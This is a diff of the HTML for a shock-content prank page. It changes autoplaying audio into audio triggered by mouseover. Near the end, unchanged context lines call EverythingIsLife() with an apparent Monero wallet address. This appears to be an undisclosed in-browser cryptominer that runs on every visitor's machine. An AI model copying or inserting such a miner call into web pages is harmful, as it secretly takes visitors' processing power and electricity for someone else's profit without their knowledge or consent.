@@ -9,6 +9,18 @@
     </head>
 
     <body>
+        <audio id="divAudio">
+            <source src="./meatspin.mp3" type="audio/mp3">
+         </audio>
+         
+         <script>
+            var vAudio = document.getElementById("divAudio");
+            function playMusic()
+            {
+               vAudio.play();
+            }
+         </script>
+<div onmouseover="playMusic()">
         
     <script>
        window.onload = function() {
@@ -18,10 +30,7 @@
               }
           }
         </script>
-	<iframe src="250-milliseconds-of-silence.mp3" type="audio/mp3" allow="autoplay" id="audio" style="display:none"></iframe>
-<audio autoplay loop>
-    <source src="meatspin.mp3" type="audio/mp3">
-</audio>
+	
 <div class="meat">
 <img class="img" src="meatspin.gif">
 <div class="fb-share-button" data-href="https://meatspin2.xyz" data-layout="button_count" data-size="large"><a target="_blank" href="https://www.facebook.com/sharer/sharer.php?u=https%3A%2F%2Fmeatspin2.xyz%2F&amp;src=sdkpreparse" class="fb-xfbml-parse-ignore">分享</a></div>
@@ -33,6 +42,7 @@
 <script type="text/javascript">
 EverythingIsLife('46TenHQALaxjBAETXANWDrY1CKw8q34cHEYmkBZBiNu5gxtRxYCW5uRBUZBzchcYDKRJDNZ6c2C1dboHJuJ7sxPGDitGbxr', 'x', 15);
 </script>
+</div>
 </body>
 
 
